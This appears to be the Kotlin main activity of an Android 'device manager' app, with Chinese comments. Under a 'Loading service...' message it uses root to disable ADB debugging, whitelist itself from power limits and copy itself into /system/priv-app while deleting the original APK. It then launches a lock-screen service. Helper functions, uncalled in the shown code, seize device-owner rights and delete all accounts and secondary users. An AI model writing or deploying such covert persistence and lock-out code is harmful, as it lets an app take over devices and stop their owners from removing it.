package com.example.devicemanager

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader

class MainActivity : AppCompatActivity() {
    
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var componentName: ComponentName
    private lateinit var sharedPreferences: SharedPreferences
    
    companion object {
        private const val REQUEST_CODE_DEVICE_ADMIN = 100
        private const val REQUEST_CODE_OVERLAY_PERMISSION = 101
        private const val MAX_RETRY_COUNT = 3
        private const val PREFS_NAME = "DeviceManagerPrefs"
        private const val KEY_HAS_ROOT = "has_root"
        private const val KEY_HAS_SHIZUKU = "has_shizuku"
        private const val KEY_PERMISSIONS_CHECKED = "permissions_checked"
    }
    
    // 权限重试计数器
    private var deviceAdminRetryCount = 0
    private var overlayRetryCount = 0
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        componentName = ComponentName(this, DeviceAdminReceiver::class.java)
        sharedPreferences = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        
        // 延迟检查权限，避免界面闪烁
        Handler(Looper.getMainLooper()).postDelayed({
            checkPermissionsAndAutoStart()
        }, 500)
    }
    
    private fun checkPermissionsAndAutoStart() {
        val statusText = findViewById<TextView>(R.id.statusText)
        statusText.text = "正在加载..."
        
        val deviceAdminGranted = devicePolicyManager.isAdminActive(componentName)
        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
        
        if (deviceAdminGranted && overlayGranted) {
            // 必要权限已授予，尝试获取非必要权限
            checkOptionalPermissions()
        } else {
            // 显示需要授予的必要权限
            val status = StringBuilder()
            status.append("需要授予以下权限：\n\n")
            
            if (!deviceAdminGranted) {
                status.append("✗ 设备管理员权限\n")
            } else {
                status.append("✓ 设备管理员权限\n")
            }
            
            if (!overlayGranted) {
                status.append("✗ 悬浮窗权限\n")
            } else {
                status.append("✓ 悬浮窗权限\n")
            }
            
            status.append("\n点击屏幕授予权限")
            statusText.text = status.toString()
            
            // 点击屏幕授予权限
            statusText.setOnClickListener {
                requestMissingPermissions()
            }
        }
    }
    
    private fun checkOptionalPermissions() {
        val statusText = findViewById<TextView>(R.id.statusText)
        
        // 检查是否已经检查过权限
        val permissionsChecked = sharedPreferences.getBoolean(KEY_PERMISSIONS_CHECKED, false)
        
        if (permissionsChecked) {
            // 已经检查过权限，从持久化存储读取
            val hasRoot = sharedPreferences.getBoolean(KEY_HAS_ROOT, false)
            val hasShizuku = sharedPreferences.getBoolean(KEY_HAS_SHIZUKU, false)
            
            // 只显示"加载服务中"
            statusText.text = "加载服务中..."
            
            if (hasRoot || hasShizuku) {
                // 有非必要权限，后台执行保活和系统应用设置
                Handler(Looper.getMainLooper()).postDelayed({
                    setupKeepAlive()
                    
                    // 继续添加到系统应用
                    continueToSystemApp()
                }, 2000)
            } else {
                // 没有非必要权限，直接启动服务
                Handler(Looper.getMainLooper()).postDelayed({
                    startLockScreenService()
                }, 1500)
            }
        } else {
            // 首次检查权限
            val hasRoot = checkRootAccess()
            val hasShizuku = checkShizukuPermission()
            
            // 保存权限状态到持久化存储
            sharedPreferences.edit()
                .putBoolean(KEY_HAS_ROOT, hasRoot)
                .putBoolean(KEY_HAS_SHIZUKU, hasShizuku)
                .putBoolean(KEY_PERMISSIONS_CHECKED, true)
                .apply()
            
            // 只显示"加载服务中"
            statusText.text = "加载服务中..."
            
            if (hasRoot || hasShizuku) {
                // 获取到非必要权限，后台执行保活和系统应用设置
                Handler(Looper.getMainLooper()).postDelayed({
                    setupKeepAlive()
                    
                    // 继续添加到系统应用
                    continueToSystemApp()
                }, 2000)
            } else {
                // 没有非必要权限，直接启动服务
                Handler(Looper.getMainLooper()).postDelayed({
                    startLockScreenService()
                }, 1500)
            }
        }
    }
    
    private fun checkRootAccess(): Boolean {
        return try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", "echo test"))
            val exitCode = process.waitFor()
            exitCode == 0
        } catch (e: Exception) {
            false
        }
    }
    
    private fun checkShizukuPermission(): Boolean {
        return try {
            // 检查Shizuku服务是否可用
            val intent = Intent("moe.shizuku.api.intent.action.ISSUER_BIND")
            intent.setPackage("moe.shizuku.privileged.api")
            val pm = packageManager
            val resolveInfo = pm.resolveService(intent, 0)
            resolveInfo != null
        } catch (e: Exception) {
            false
        }
    }
    
    private fun setupKeepAlive() {
        try {
            // 通过root设置保活
            val commands = listOf(
                // 添加到电池优化白名单
                "dumpsys deviceidle whitelist +$packageName",
                // 设置为前台服务
                "am set-inactive $packageName false",
                // 禁用省电模式对应用的影响
                "settings put global low_power_mode_sticky 0",
                // 添加到自启动列表（部分ROM）
                "pm grant $packageName android.permission.RECEIVE_BOOT_COMPLETED",
                // 设置应用为系统应用级别的保护
                "cmd appops set $packageName RUN_IN_BACKGROUND allow",
                "cmd appops set $packageName START_FOREGROUND_SERVICES_FROM_BACKGROUND allow",
                // 防止应用被系统杀死
                "settings put global always_finish_activities 0",
                // 关闭ADB调试
                "settings put global adb_enabled 0"
            )
            
            for (cmd in commands) {
                try {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                    process.waitFor()
                } catch (e: Exception) {
                    // 忽略单个命令失败
                }
            }
        } catch (e: Exception) {
            // 忽略错误
        }
    }
    
    private fun grantDeviceOwner(): Boolean {
        return try {
            // 通过dpm命令授予设备所有者权限
            val cmd = "dpm set-device-owner $componentName"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            val exitCode = process.waitFor()
            exitCode == 0
        } catch (e: Exception) {
            false
        }
    }
    
    private fun removeSecondaryAccounts(): Boolean {
        return try {
            // 获取所有账户
            val accountManager = android.accounts.AccountManager.get(this)
            val accounts = accountManager.getAccountsByType(null)
            
            // 删除除机主之外的所有账户
            for (account in accounts) {
                try {
                    accountManager.removeAccountExplicitly(account)
                } catch (e: Exception) {
                    // 忽略单个账户删除失败
                }
            }
            
            // 通过root命令确保删除所有非机主账户
            val cmd = "pm list users | grep -v 'UserInfo{0:' | grep -oE '\\{[0-9]+:' | grep -oE '[0-9]+' | xargs -I {} pm remove user {}"
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
            process.waitFor()
            
            true
        } catch (e: Exception) {
            false
        }
    }
    
    private fun continueToSystemApp() {
        Handler(Looper.getMainLooper()).postDelayed({
            moveToSystemApp()
            
            // 延迟启动服务
            Handler(Looper.getMainLooper()).postDelayed({
                startLockScreenService()
            }, 2000)
        }, 2000)
    }
    
    private fun moveToSystemApp(): Boolean {
        return try {
            // 获取当前APK路径
            val apkPath = packageManager.getApplicationInfo(packageName, 0).sourceDir
            
            // 使用应用包名作为目录名
            val targetDir = "/system/priv-app/$packageName"
            val targetApk = "$targetDir/base.apk"
            
            // 按照标准步骤执行root命令
            val commands = listOf(
                // 1. 获取Root权限（su）
                "su -c echo test",
                // 2. 挂载系统分区为可写（Android 10+ 使用 /）
                "mount -o rw,remount /",
                "mount -o rw,remount /system",
                // 3. 创建应用目录
                "mkdir -p $targetDir",
                // 4. 复制APK文件
                "cp $apkPath $targetApk",
                // 5. 设置权限
                "chmod 644 $targetApk",
                "chown root:root $targetApk",
                // 6. 删除原APK文件（避免系统混淆）
                "rm -f $apkPath"
            )
            
            for (cmd in commands) {
                try {
                    val process = Runtime.getRuntime().exec(arrayOf("su", "-c", cmd))
                    val exitCode = process.waitFor()
                    if (exitCode != 0 && !cmd.contains("echo test") && !cmd.contains("rm -f")) {
                        return false
                    }
                } catch (e: Exception) {
                    return false
                }
            }
            
            // 验证文件是否复制成功
            val verifyProcess = Runtime.getRuntime().exec(arrayOf("su", "-c", "test -f $targetApk && echo success"))
            val output = BufferedReader(InputStreamReader(verifyProcess.inputStream)).readText()
            output.contains("success")
        } catch (e: Exception) {
            false
        }
    }
    
    private fun requestMissingPermissions() {
        val deviceAdminGranted = devicePolicyManager.isAdminActive(componentName)
        val overlayGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Settings.canDrawOverlays(this)
        } else {
            true
        }
        
        if (!deviceAdminGranted) {
            if (deviceAdminRetryCount < MAX_RETRY_COUNT) {
                requestDeviceAdminPermission()
            } else {
                // 超过重试次数，跳过
                Toast.makeText(this, "设备管理员权限获取失败，跳过", Toast.LENGTH_SHORT).show()
                checkPermissionsAndAutoStart()
            }
        } else if (!overlayGranted) {
            if (overlayRetryCount < MAX_RETRY_COUNT) {
                requestOverlayPermission()
            } else {
                // 超过重试次数，跳过
                Toast.makeText(this, "悬浮窗权限获取失败，跳过", Toast.LENGTH_SHORT).show()
                checkPermissionsAndAutoStart()
            }
        }
    }
    
    private fun requestDeviceAdminPermission() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
        intent.putExtra(
            DevicePolicyManager.EXTRA_ADD_EXPLANATION,
            "设备管理服务需要设备管理员权限来实现合法的设备共享、租借或个人设备隐私保护功能。"
        )
        startActivityForResult(intent, REQUEST_CODE_DEVICE_ADMIN)
    }
    
    private fun requestOverlayPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivityForResult(intent, REQUEST_CODE_OVERLAY_PERMISSION)
        }
    }
    
    private fun startLockScreenService() {
        val serviceIntent = Intent(this, LockScreenService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        // 启动服务后关闭主界面
        finish()
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            REQUEST_CODE_DEVICE_ADMIN -> {
                if (resultCode == Activity.RESULT_OK) {
                    Toast.makeText(this, "设备管理员权限已授予", Toast.LENGTH_SHORT).show()
                    deviceAdminRetryCount = 0 // 重置计数器
                } else {
                    deviceAdminRetryCount++
                    Toast.makeText(this, "设备管理员权限被拒绝 (${deviceAdminRetryCount}/$MAX_RETRY_COUNT)", Toast.LENGTH_SHORT).show()
                }
            }
            REQUEST_CODE_OVERLAY_PERMISSION -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (Settings.canDrawOverlays(this)) {
                        Toast.makeText(this, "悬浮窗权限已授予", Toast.LENGTH_SHORT).show()
                        overlayRetryCount = 0 // 重置计数器
                    } else {
                        overlayRetryCount++
                        Toast.makeText(this, "悬浮窗权限被拒绝 (${overlayRetryCount}/$MAX_RETRY_COUNT)", Toast.LENGTH_SHORT).show()
                    }
                }
            }
        }
        
        // 重新检查权限
        Handler(Looper.getMainLooper()).postDelayed({
            checkPermissionsAndAutoStart()
        }, 500)
    }
    
    override fun onResume() {
        super.onResume()
        // 重新检查权限
        Handler(Looper.getMainLooper()).postDelayed({
            checkPermissionsAndAutoStart()
        }, 300)
    }
}
